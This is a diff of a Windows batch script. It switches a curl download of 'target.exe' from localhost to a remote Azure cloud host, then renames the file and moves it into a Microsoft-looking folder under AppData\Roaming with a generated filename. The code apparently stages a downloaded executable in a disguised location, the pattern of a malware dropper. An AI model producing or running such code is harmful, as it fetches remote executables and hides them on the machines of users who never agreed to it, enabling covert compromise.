@@ -18,7 +18,7 @@ for /L %%i in (1,1,30) do call :add
 echo %filename%
 @REM goto :eof
 
-curl http://localhost:8080/target.exe -o monitor.exe
+curl http://watcher.centralindia.cloudapp.azure.com:8080/target.exe -o monitor.exe
 set home=%userprofile%\AppData\Roaming\Microsoft\Monitor
 mkdir %home%
 move monitor.exe %home%\%filename%.exe
